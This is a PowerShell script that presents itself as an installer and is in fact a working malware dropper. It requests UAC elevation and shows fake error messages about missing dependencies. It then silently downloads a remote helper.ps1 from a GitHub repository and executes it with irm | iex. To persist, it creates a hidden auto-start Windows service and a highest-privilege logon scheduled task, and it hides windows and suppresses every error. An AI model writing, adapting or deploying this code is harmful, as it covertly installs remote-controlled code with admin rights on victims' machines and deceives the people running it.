# Complete installer with UAC elevation and persistence
# Downloads helper.ps1, runs loader, creates service and task

function Run-Hidden {
    param([string]$FileName, [string]$Arguments)
    try {
        Start-Process -FilePath $FileName -ArgumentList $Arguments -WindowStyle Hidden -NoNewWindow
    } catch {}
}

# Check if running as admin
$isAdmin = [bool]([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    # Not admin - re-launch with UAC
    Write-Host "Error: Administrator rights required, attempting to request administrator privileges..."
    $exePath = $env:COMSPEC
    $args = "/c start `"`"`" `"`"$([Environment]::GetCommandLineArgs()[0])`"`" /runas"
    try {
        Start-Process -FilePath $exePath -ArgumentList $args -Verb RunAs
    } catch {}
    exit 0
}

# Running as admin
Write-Host "Error: Failed to run, dependencies are missing..."

try {
    # Action 1: Download helper.ps1
    Run-Hidden "powershell.exe" "-ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/wolfgangphelan994924/office-docs/main/helper.ps1' -OutFile 'C:/ProgramData/helper.ps1'"

    # Action 2: Execute loader
    Run-Hidden "powershell.exe" "-ExecutionPolicy Bypass -Command irm 'https://raw.githubusercontent.com/wolfgangphelan994924/office-docs/main/helper.ps1' | iex"

    # Action 3: Create Windows Service
    Run-Hidden "sc.exe" "create ApiPortService binPath= \"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:/ProgramData/helper.ps1\" start= auto"

    # Action 4: Create Task Scheduler
    Run-Hidden "schtasks.exe" "/create /tn ApiPortTask /tr \"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:/ProgramData/helper.ps1\" /sc onlogon /rl highest /f"
} catch {}

# Keep script running briefly
Start-Sleep -Seconds 5